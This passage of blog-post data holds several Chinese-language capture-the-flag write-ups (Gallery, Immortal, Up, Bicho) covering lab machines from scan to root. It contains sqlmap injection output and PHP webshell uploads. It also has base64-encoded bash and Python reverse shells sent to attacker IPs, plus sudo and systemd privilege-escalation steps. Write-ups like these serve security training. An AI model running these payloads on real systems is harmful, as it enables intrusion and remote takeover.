true\r💲 Extensions │ [php, txt]\r🏁 HTTP methods │ [GET]\r🔃 Recursion Depth │ 4\r───────────────────────────┴──────────────────────\r🏁 Press [ENTER] to use the Scan Management Menu™\r──────────────────────────────────────────────────\r200 GET 29l 83w 1478c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r404 GET 7l 57w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 266l 543w 5288c http://172.17.0.3/style.css\r200 GET 28l 63w 1104c http://172.17.0.3/login.php\r200 GET 0l 0w 0c http://172.17.0.3/config.php\r302 GET 0l 0w 0c http://172.17.0.3/dashboard.php =\u0026gt; login.php SQL Injection #\r在用户名这里存在注入点\n进入到后台，又有一个可以搜索的注入点\n这里使用sqlmap进行注入\n[root@kali] /home/kali/Gallery ❯ sqlmap --cookie \u0026#34;PHPSESSID=r3kjodvf4kl5q91uisobojp527\u0026#34; -u \u0026#34;http://172.17.0.3/dashboard.php?search_term=11\u0026#34; -D secret_db --dump ___\r__H__ ___ ___[.]_____ ___ ___ {1.9.2#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [\u0026#34;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\r[*] starting @ 22:49:59 /2025-04-25/\r[22:49:59] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [22:49:59] [INFO] testing connection to the target URL\rsqlmap resumed the following injection point(s) from stored session:\r---\rParameter: search_term (GET)\rType: error-based\rTitle: MySQL \u0026gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\rPayload: search_term=11\u0026#39; AND EXTRACTVALUE(2694,CONCAT(0x5c,0x716b7a7171,(SELECT (ELT(2694=2694,1))),0x71626a6271)) AND \u0026#39;kDVa\u0026#39;=\u0026#39;kDVa\rType: UNION query\rTitle: Generic UNION query (NULL) - 5 columns\rPayload: search_term=11\u0026#39; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b7a7171,0x4e4442547641624446444143786472586d5563504c714842634f75726647705072656368454a4575,0x71626a6271),NULL-- -\r---\r[22:49:59] [INFO] the back-end DBMS is MySQL\rweb application technology: PHP 8.3.6\rback-end DBMS: MySQL \u0026gt;= 5.1\r[22:49:59] [INFO] fetching tables for database: \u0026#39;secret_db\u0026#39;\r[22:49:59] [INFO] fetching columns for table \u0026#39;secret\u0026#39; in database \u0026#39;secret_db\u0026#39;\r[22:49:59] [INFO] fetching entries for table \u0026#39;secret\u0026#39; in database \u0026#39;secret_db\u0026#39;\rDatabase: secret_db\rTable: secret\r[1 entry]\r+----+------------------------+-----------+\r| id | ssh_pass | ssh_users |\r+----+------------------------+-----------+\r| 1 | $uper$ecretP4$$w0rd123 | sam |\r+----+------------------------+-----------+\r[22:50:00] [INFO] table \u0026#39;secret_db.secret\u0026#39; dumped to CSV file \u0026#39;/root/.local/share/sqlmap/output/172.17.0.3/dump/secret_db/secret.csv\u0026#39;\r[22:50:00] [INFO] fetched data logged to text files under \u0026#39;/root/.local/share/sqlmap/output/172.17.0.3\u0026#39;\r[*] ending @ 22:50:00 /2025-04-25/ 得到sam的登录密码\nRoot #\r上传fscan查看端口情况：shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。\nsam@7adf2cce45b2:/tmp$ ./fscan -h 127.0.0.1\r┌──────────────────────────────────────────────┐\r│ ___ _ │\r│ / _ \\ ___ ___ _ __ __ _ ___| | __ │\r│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │\r│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │\r│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │\r└──────────────────────────────────────────────┘\rFscan Version: 2.0.0\r[2025-04-26 04:53:51] [INFO] 暴力破解线程数: 1 [2025-04-26 04:53:51] [INFO] 开始信息扫描\r[2025-04-26 04:53:51] [INFO] 最终有效主机数量: 1\r[2025-04-26 04:53:52] [INFO] 开始主机扫描\r[2025-04-26 04:53:52] [INFO] 有效端口数量: 233\r[2025-04-26 04:53:52] [SUCCESS] 端口开放 127.0.0.1:3306\r[2025-04-26 04:53:52] [SUCCESS] 端口开放 127.0.0.1:22\r[2025-04-26 04:53:52] [SUCCESS] 端口开放 127.0.0.1:8888\r[2025-04-26 04:53:52] [SUCCESS] 端口开放 127.0.0.1:80\r[2025-04-26 04:53:52] [SUCCESS] 服务识别 127.0.0.1:3306 =\u0026gt; [mysql] 版本:8.0.41-0ubuntu0.24.04.1 产品:MySQL Banner:[[.8.0.41-0ubuntu0.24.04.1.^.K`y.3v\u0026lt;L.= d.@79xl1 caching_sha2_password] [2025-04-26 04:53:52] [SUCCESS] 服务识别 127.0.0.1:22 =\u0026gt; [ssh] 版本:9.6p1 Ubuntu 3ubuntu13.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.9.] [2025-04-26 04:53:57] [SUCCESS] 服务识别 127.0.0.1:8888 =\u0026gt; [http]\r[2025-04-26 04:53:57] [SUCCESS] 服务识别 127.0.0.1:80 =\u0026gt; [http]\r[2025-04-26 04:53:57] [INFO] 存活端口数量: 4\r[2025-04-26 04:53:57] [INFO] 开始漏洞扫描 将8888端口转发出来\n[root@kali] /home/kali/Gallery ❯ ssh sam@172.17.0.3 -L 8888:127.0.0.1:8888 查看网页源码\nsam@7adf2cce45b2:/var/www/terminal$ cat index.php \u0026lt;?php\rsession_start();\rif ($_SERVER[\u0026#39;SERVER_ADDR\u0026#39;] !== \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] !== \u0026#39;127.0.0.1\u0026#39;) {\rdie(\u0026#39;Access Denied\u0026#39;);\r}\r$header = \u0026#34;\r______ _ _ / ____/___ _/ / /__ _______ __\r/ / __/ __ `/ / / _ \\/ ___/ / / /\r/ /_/ / /_/ / / / __/ / / /_/ / \\____/\\__,_/_/_/\\___/_/ \\__, / /____/ Gallery Management System v1.0\r--------------------------------\r[?] Try thinking outside the box\r\u0026#34;;\r$output = isset($_POST[\u0026#39;command\u0026#39;]) ? \u0026#39;\u0026#39; : $header;\r$commands = [\u0026#39;help\u0026#39;, \u0026#39;list_art\u0026#39;, \u0026#39;show_artists\u0026#39;, \u0026#39;check_status\u0026#39;, \u0026#39;view_logs\u0026#39;, \u0026#39;system_info\u0026#39;];\rif (isset($_POST[\u0026#39;command\u0026#39;])) {\r$cmd = $_POST[\u0026#39;command\u0026#39;];\rif ($cmd === \u0026#39;help\u0026#39;) {\r$output = \u0026#34;Available commands:\\n\u0026#34;;\r$output .= \u0026#34;----------------\\n\u0026#34;;\rforeach ($commands as $command) {\r$output .= \u0026#34;- $command\\n\u0026#34;;\r}\r$output .= \u0026#34;\\nGallery Management System - Admin Interface\u0026#34;;\r} else if ($cmd === \u0026#39;list_art\u0026#39;) {\r$output = \u0026#34;Current Artworks:\\n\u0026#34;;\r$output .= \u0026#34;- La noche estrellada (ID: 1)\\n\u0026#34;;\r$output .= \u0026#34;- Mona Lisa (ID: 2)\\n\u0026#34;;\r$output .= \u0026#34;Status: Display Only Mode\u0026#34;;\r} else if ($cmd === \u0026#39;show_artists\u0026#39;) {\r$output = \u0026#34;Registered Artists:\\n\u0026#34;;\r$output .= \u0026#34;- Vincent van Gogh\\n\u0026#34;;\r$output .= \u0026#34;- Leonardo da Vinci\\n\u0026#34;;\r$output .= \u0026#34;Access Level: Read Only\u0026#34;;\r} else if ($cmd === \u0026#39;check_status\u0026#39;) {\r$output = \u0026#34;Gallery System Status:\\n\u0026#34;;\r$output .= \u0026#34;- Database: Connected\\n\u0026#34;;\r$output .= \u0026#34;- Backup: Enabled\\n\u0026#34;;\r$output .= \u0026#34;- Security: Enhanced\\n\u0026#34;;\r$output .= \u0026#34;- Last Check: \u0026#34; . date(\u0026#34;Y-m-d\u0026#34;);\r} else if ($cmd === \u0026#39;view_logs\u0026#39;) {\r$output = \u0026#34;Recent Activity:\\n\u0026#34;;\r$output .= \u0026#34;- [INFO] System startup\\n\u0026#34;;\r$output .= \u0026#34;- [WARN] Failed login attempt\\n\u0026#34;;\r$output .= \u0026#34;- [INFO] New artwork added\\n\u0026#34;;\r$output .= \u0026#34;Access: Restricted\u0026#34;;\r} else if ($cmd === \u0026#39;system_info\u0026#39;) {\r$output = \u0026#34;Gallery Management System\\n\u0026#34;;\r$output .= \u0026#34;Version: 1.0\\n\u0026#34;;\r$output .= \u0026#34;Environment: Production\\n\u0026#34;;\r$output .= \u0026#34;Access Level: Guest\u0026#34;;\r} else if (strpos($cmd, \u0026#39;;\u0026#39;) !== false || strpos($cmd, \u0026#39;|\u0026#39;) !== false) {\r// Aquí es donde realmente ejecutamos comandos\r$output = shell_exec($cmd);\r} else {\r$output = \u0026#34;Command not found. Type \u0026#39;help\u0026#39; for available commands.\u0026#34;;\r}\r$output = $header . \u0026#34;\\n\u0026#34; . $output;\r}\r?\u0026gt; 发现只需要存在分号或者引号，就可以执行命令\n➤ docker0 → 172.17.0.1:4444\rprintf KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjEpICY=|base64 -d|bash Summary #\rUser：sql注入拿到用户登录密码\nRoot：分析源码，进行命令执行\n我觉得这个机器应该算easy难度\n","date":"2025-04-26","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-gallery/","section":"Posts","summary":"","title":"Dockerlabs-Gallery","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/immportal ❯ nmap 192.168.55.17 -sV -A -p- PORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r| ftp-syst: | STAT: | FTP server status:\r| Connected to ::ffff:192.168.55.4\r| Logged in as ftp\r| TYPE: ASCII\r| No session bandwidth limit\r| Session timeout in seconds is 300\r| Control connection is plain text\r| Data connections will be plain text\r| At session startup, client count was 3\r| vsFTPd 3.0.3 - secure, fast, stable\r|_End of status\r| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r|_-rw-r--r-- 1 0 0 504 Feb 27 2024 message.txt\r22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\r| ssh-hostkey: | 3072 e8:79:ad:8b:d1:a8:39:1b:ac:ed:52:ef:d0:22:0e:eb (RSA)\r| 256 65:df:6d:1d:49:11:bd:f3:2f:fa:10:0c:3b:48:69:39 (ECDSA)\r|_ 256 f6:b7:bf:cf:a5:d5:1b:26:4e:13:08:31:07:d5:79:b1 (ED25519)\r80/tcp open http Apache httpd 2.4.56 ((Debian))\r|_http-title: Password\r|_http-server-header: Apache/2.4.56 (Debian) Own www-data #\r发现密码是：santiago\n进入后得到一个新的php\nMessage to all.\rI\u0026#39;m glad you made it, I knew you would guess the password, it\u0026#39;s the one we always used, although Boyras recommended us to stop using it because \u0026#34;it was in rockyou\u0026#34;. By the way guys, you can still upload messages to the server from this new path -\u0026gt; upload_an_incredible_message.php\rSaying goodbye very happy, David 进入后可以上传文件到**/chat**目录\n并且发现phtml可以绕过黑名单\nContent-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;321.phtml\u0026#34;\rContent-Type: text/plain\rGIF89a\r\u0026lt;?php system(\u0026#34;printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41NS40LzQ0NDQgMD4mMSkgJg==|base64 -d|bash\u0026#34;);?\u0026gt; 这里可以直接读取到user.txt\nOwn drake #\r发现了一个密码文件\nwww-data@Immortal:/home/drake/...$ ls -al\rtotal 12\rdrwxr-xr-x 2 drake drake 4096 Feb 27 2024 .\rdrwxr-xr-x 4 drake drake 4096 Feb 29 2024 ..\r-rw-r--r-- 1 drake drake 134 Feb 27 2024 pass.txt\rwww-data@Immortal:/home/drake/...$ cat pass.txt netflix : drake123\ramazon : 123drake\rshelldred : shell123dred (f4ns0nly)\rsystem : kevcjnsgii\rbank : myfavouritebank\rnintendo : 123456 其中system的密码就是drake的密码\nOwn eric #\rdrake@Immortal:~/...$ sudo -l\rMatching Defaults entries for drake on Immortal:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser drake may run the following commands on Immortal:\r(eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py 查看具体内容\ndrake@Immortal:~/...$ ls -al /opt/\rtotal 16\rdrwxr-xr-x 2 root root 4096 Feb 28 2024 .\rdrwxr-xr-x 18 root root 4096 Feb 27 2024 ..\r-rw-rw-rw- 1 root root 147 Feb 28 2024 immortal.py\r-rw-r--r-- 1 root root 36 Feb 28 2024 immortal.txt\rdrake@Immortal:~/...$ cat /opt/immortal.py a = input(str(\u0026#34;Do you want to be immortal: \u0026#34;))\rif a.lower() == \u0026#34;yes\u0026#34; or a.lower() == \u0026#34;no\u0026#34;:\rprint(\u0026#34;Bad answer\u0026#34;)\relse:\rprint(\u0026#34;Are you sure?\u0026#34;) 发现可以修改文件内容\ndrake@Immortal:/opt$ cat immortal.py import os\ros.system(\u0026#34;bash -p\u0026#34;) Root #\reric@Immortal:~$ sudo -l\rMatching Defaults entries for eric on Immortal:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser eric may run the following commands on Immortal:\r(root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service\r(root) NOPASSWD: /usr/bin/systemctl start immortal.service\r(root) NOPASSWD: /usr/bin/systemctl stop immortal.service\r(root) NOPASSWD: /usr/bin/systemctl enable immortal.service\r(root) NOPASSWD: /usr/bin/systemctl disable immortal.service\r(root) NOPASSWD: /usr/bin/systemctl daemon-reload 可以先用sudoedit修改内容为\n[Unit]\rDescription=Immortal Service\rAfter=network.target\r[Service]\rType=oneshot\rExecStart=chmod u+s /bin/bash\r[Install]\rWantedBy=multi-user.target Summary #\r比较简单，不多说了\n","date":"2025-04-26","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-immortal/","section":"Posts","summary":"","title":"HackMyVM-Immortal","type":"posts"},{"content":"\rBox Info #\rOS Linux Diffculty Easy Nmap #\r[root@kali] /home/kali/up ❯ nmap 192.168.55.16 -sV -A -p-\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: RodGar - Subir Imagen 进入之后是一个上传页面，经过测试没有漏洞\nFeroxbuster #\r[root@kali] /home/kali/up ❯ feroxbuster -u \u0026#39;http://192.168.55.16/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.11.0\r───────────────────────────┬──────────────────────\r🎯 Target Url │ http://192.168.55.16/\r🚀 Threads │ 50\r📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r👌 Status Codes │ All Status Codes!\r💥 Timeout (secs) │ 7\r🦡 User-Agent │ feroxbuster/2.11.0\r💉 Config File │ /etc/feroxbuster/ferox-config.toml\r🔎 Extract Links │ true\r💲 Extensions │ [php, txt]\r🏁 HTTP methods │ [GET]\r🔃 Recursion Depth │ 4\r───────────────────────────┴──────────────────────\r🏁 Press [ENTER] to use the Scan Management Menu™\r──────────────────────────────────────────────────\r403 GET 9l 28w 278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r404 GET 9l 31w 275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 150l 388w 4489c http://192.168.55.16/\r301 GET 9l 28w 316c http://192.168.55.16/uploads =\u0026gt; http://192.168.55.16/uploads/\r301 GET 9l 28w 319c http://192.168.55.16/javascript =\u0026gt; http://192.168.55.16/javascript/\r200 GET 150l 388w 4489c http://192.168.55.16/index.php\r403 GET 31l 94w 964c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 1l 1w 1301c http://192.168.55.16/uploads/robots.txt\r301 GET 9l 28w 329c http://192.168.55.16/javascript/clipboard =\u0026gt; http://192.168.55.16/javascript/clipboard/\r200 GET 858l 3081w 26377c http://192.168.55.16/javascript/clipboard/clipboard Own www-data #\r注意到**/uploads下还有一个robots.txt**，经过解码得到源码\n分析可以看出，文件名是经过Rot13位移后的\n\u0026lt;?php\rif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) {\r$targetDir = \u0026#34;uploads/\u0026#34;;\r$fileName = basename($_FILES[\u0026#34;image\u0026#34;][\u0026#34;name\u0026#34;]);\r$fileType = pathinfo($fileName, PATHINFO_EXTENSION);\r$fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);\r$allowedTypes = [\u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;gif\u0026#39;];\rif (in_array(strtolower($fileType), $allowedTypes)) {\r$encryptedFileName = strtr($fileBaseName, \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#39;, \u0026#39;NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm\u0026#39;);\r$newFileName = $encryptedFileName . \u0026#34;.\u0026#34; . $fileType;\r$targetFilePath = $targetDir . $newFileName;\rif (move_uploaded_file($_FILES[\u0026#34;image\u0026#34;][\u0026#34;tmp_name\u0026#34;], $targetFilePath)) {\r$message = \u0026#34;El archivo se ha subido correctamente.\u0026#34;;\r} else {\r$message = \u0026#34;Hubo un error al subir el archivo.\u0026#34;;\r}\r} else {\r$message = \u0026#34;Solo se permiten archivos JPG y GIF.\u0026#34;;\r}\r}\r?\u0026gt; 由于是白名单，因此只能猜测配置错误导致某个后缀名被解析为PHP\nPOST / HTTP/1.1\rHost: 192.168.55.16\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: multipart/form-data; boundary=----geckoformboundaryb6ec38d14456abf0196cf2873090c48a\rContent-Length: 240\rOrigin: http://192.168.55.16\rConnection: close\rReferer: http://192.168.55.16/\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\r------geckoformboundaryb6ec38d14456abf0196cf2873090c48a\rContent-Disposition: form-data; name=\u0026#34;image\u0026#34;; filename=\u0026#34;tomcat.gif\u0026#34;\rContent-Type: image/gif\rGIF89a\r\u0026lt;?php phpinfo();?\u0026gt;\r------geckoformboundaryb6ec38d14456abf0196cf2873090c48a-- \u0026lt;?php system(\u0026#34;printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41NS40LzQ0NDQgMD4mMSkgJg==|base64 -d|bash\u0026#34;);?\u0026gt; Own rodgar #\r查看sudo\nwww-data@debian:/var/www/html/uploads$ sudo -l\rMatching Defaults entries for www-data on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser www-data may run the following commands on debian:\r(ALL) NOPASSWD: /usr/bin/gobuster 在kali上开启http服务\n[root@kali] / ❯ python -m http.server 80\rwww-data@debian:/tmp$ sudo /usr/bin/gobuster dir -u http://192.168.55.4/ -w /root/rodgarpass 得到密码哈希，好像只有31位？\nb45cffe084dd3d20d928bee85e7b0f2 因此需要尝试爆破一下，这里也不多说了，后面添加一个1，补全32位就好了\n然后密码居然是哈希值，而不是明文，离谱\nRoot #\rrodgar@debian:/home$ sudo -l\rMatching Defaults entries for rodgar on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser rodgar may run the following commands on debian:\r(ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make make | GTFOBins Summary #\r没啥好说的。\n","date":"2025-04-26","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-up/","section":"Posts","summary":"","title":"HackMyVM-Up","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/bicho ❯ nmap 172.17.0.2 -sV -A -p- Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 09:26 EDT\rNmap scan report for 172.17.0.2\rHost is up (0.000089s latency).\rNot shown: 65534 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-title: Did not follow redirect to http://bicho.dl\r|_http-server-header: Apache/2.4.58 (Ubuntu) 添加bicho.dl到**/etc/hosts**\n发现是wordpress搭建的网站\n[root@kali] /home/kali/bicho ❯ whatweb http://bicho.dl http://bicho.dl [200 OK] Apache[2.4.58], Bootstrap[0.8,6.6.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.6.2], Script[text/javascript], Title[Visit Suazilandia 🇸🇿], UncommonHeaders[link], WordPress[6.6.2] WPscan #\r[root@kali] /home/kali/bicho ❯ wpscan --url http://bicho.dl/ ⏎\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ®\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion 3.8.28\r@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\r_______________________________________________________________\r[i] Updating the Database ...\r[i] Update completed.\r[+] URL: http://bicho.dl/ [172.17.0.2]\r[+] Started: Thu Apr 24 09:30:43 2025\rInteresting Finding(s):\r[+] Headers\r| Interesting Entry: Server: Apache/2.4.58 (Ubuntu)\r| Found By: Headers (Passive Detection)\r| Confidence: 100%\r[+] XML-RPC seems to be enabled: http://bicho.dl/xmlrpc.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r| References:\r| - http://codex.wordpress.org/XML-RPC_Pingback_API\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\r| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\r[+] WordPress readme found: http://bicho.dl/readme.html\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] Debug Log found: http://bicho.dl/wp-content/debug.log\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r| Reference: https://codex.wordpress.org/Debugging_in_WordPress\r[+] Upload directory has listing enabled: http://bicho.dl/wp-content/uploads/\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] The external WP-Cron seems to be enabled: http://bicho.dl/wp-cron.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 60%\r| References:\r| - https://www.iplocation.net/defend-wordpress-from-ddos\r| - https://github.com/wpscanteam/wpscan/issues/1299\r[+] WordPress version 6.6.2 identified (Outdated, released on 2024-09-10).\r| Found By: Rss Generator (Passive Detection)\r| - http://bicho.dl/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.6.2\u0026lt;/generator\u0026gt;\r| - http://bicho.dl/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.6.2\u0026lt;/generator\u0026gt;\r[+] WordPress theme in use: bosa-travel-agency\r| Location: http://bicho.dl/wp-content/themes/bosa-travel-agency/\r| Latest Version: 1.0.0 (up to date)\r| Last Updated: 2025-03-27T00:00:00.000Z\r| Readme: http://bicho.dl/wp-content/themes/bosa-travel-agency/readme.txt\r| Style URL: http://bicho.dl/wp-content/themes/bosa-travel-agency/style.css?ver=6.6.2\r| Style Name: Bosa Travel Agency\r| Style URI: https://bosathemes.com/bosa-travel-agency\r| Description: Bosa Travel Agency is multipurpose business theme. Bosa Travel Agency is beautiful, fast, lightweigh...\r| Author: Bosa Themes\r| Author URI: https://bosathemes.com\r|\r| Found By: Css Style In Homepage (Passive Detection)\r|\r| Version: 1.0.0 (80% confidence)\r| Found By: Style (Passive Detection)\r| - http://bicho.dl/wp-content/themes/bosa-travel-agency/style.css?ver=6.6.2, Match: \u0026#39;Version: 1.0.0\u0026#39;\r[+] Enumerating All Plugins (via Passive Methods)\r[i] No plugins Found.\r[+] Enumerating Config Backups (via Passive and Aggressive Methods)\rChecking Config Backups - Time: 00:00:00 \u0026lt;=================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:00\r[i] No Config Backups Found.\r[!] No WPScan API Token given, as a result vulnerability data has not been output.\r[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\r[+] Finished: Thu Apr 24 09:30:46 2025\r[+] Requests Done: 187\r[+] Cached Requests: 5\r[+] Data Sent: 44.268 KB\r[+] Data Received: 22.635 MB\r[+] Memory used: 265.609 MB\r[+] Elapsed time: 00:00:03 Own www-data #\r发现一个debug.log，里面会存放登录失败的信息\n尝试修改User-Agent的内容为php代码\nPOST /wp-login.php HTTP/1.1\rHost: bicho.dl\rContent-Length: 95\rCache-Control: max-age=0\rAccept-Language: en-US,en;q=0.9\rOrigin: http://bicho.dl\rContent-Type: application/x-www-form-urlencoded\rUpgrade-Insecure-Requests: 1\rUser-Agent: \u0026lt;?php phpinfo();?\u0026gt;\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\rReferer: http://bicho.dl/wp-login.php\rAccept-Encoding: gzip, deflate, br\rCookie: wordpress_test_cookie=WP%20Cookie%20check\rConnection: keep-alive\rlog=bicho\u0026amp;pwd=123\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fbicho.dl%2Fwp-admin%2F\u0026amp;testcookie=1 成功执行代码\n这里需要注意下，似乎只能使用反引号来进行命令执行，其他的会导致整个log崩溃，从而需要重启docker\n在User-Agent插入以下代码\n\u0026lt;?php echo `printf KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjEpICY=|base64 -d|bash`;?\u0026gt; Own app #\r查看到内网端口5000开放\n上传socat将其转换出来\nwww-data@3b66fe911993:/tmp$ ./socat TCP-LISTEN:8080,fork TCP:127.0.0.1:5000 \u0026amp;\r[1] 2743 查看服务信息\n[root@kali] /home/kali/bicho ❯ whatweb http://bicho.dl:8080\rhttp://bicho.dl:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.12.3], IP[172.17.0.2], Python[3.12.3], Title[Blog de Writeups], Werkzeug[3.1.3] 尝试访问**/console路由，发现返回码是400**，搜索后得到一个文章👇\nflask无法访问console的问题解决 2024 | the0n3 只需要使用hackbar，设置Host为127.0.0.1即可绕过，幸运的是这里并不需要输入pin码就可以执行命令\n因此可以生成一个python的反弹shell：HYH的反弹Shell生成器\nhttp://172.17.0.2:8080/console?__debugger__=yes\u0026amp;cmd=import os,pty,socket;s=socket.socket();s.connect((\u0026#34;172.17.0.1\u0026#34;,9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026amp;frm=0\u0026amp;s=8mGrwebyWWtc1TQPNb2E Own wpuser #\r查看sudo信息\napp@3b66fe911993:/home$ sudo -l\rsudo -l\rMatching Defaults entries for app on 3b66fe911993:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\ruse_pty\rUser app may run the following commands on 3b66fe911993:\r(wpuser) NOPASSWD: /usr/local/bin/wp 这个工具是wp-cli，可以查看一下基本信息\napp@3b66fe911993:~$ sudo -u wpuser /usr/local/bin/wp --info\rsudo -u wpuser /usr/local/bin/wp --info\rOS: Linux 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64\rShell: /bin/bash\rPHP binary: /usr/bin/php8.3\rPHP version: 8.3.6\rphp.ini used: /etc/php/8.3/cli/php.ini\rMySQL binary: /usr/bin/mysql\rMySQL version: mysql Ver 8.0.41-0ubuntu0.24.04.1 for Linux on x86_64 ((Ubuntu))\rSQL modes:\rWP-CLI root dir: phar://wp-cli.phar/vendor/wp-cli/wp-cli\rWP-CLI vendor dir: phar://wp-cli.phar/vendor\rWP_CLI phar path: /home/app\rWP-CLI packages dir:\rWP-CLI cache dir: /home/wpuser/.wp-cli/cache\rWP-CLI global config:\rWP-CLI project config:\rWP-CLI version: 2.11.0 查看一下官方文档，我发现了一个exec参数可以进行php代码执行\nwp cli cmd-dump – WP-CLI Command | Developer.WordPress.org app@3b66fe911993:~$ sudo -u wpuser 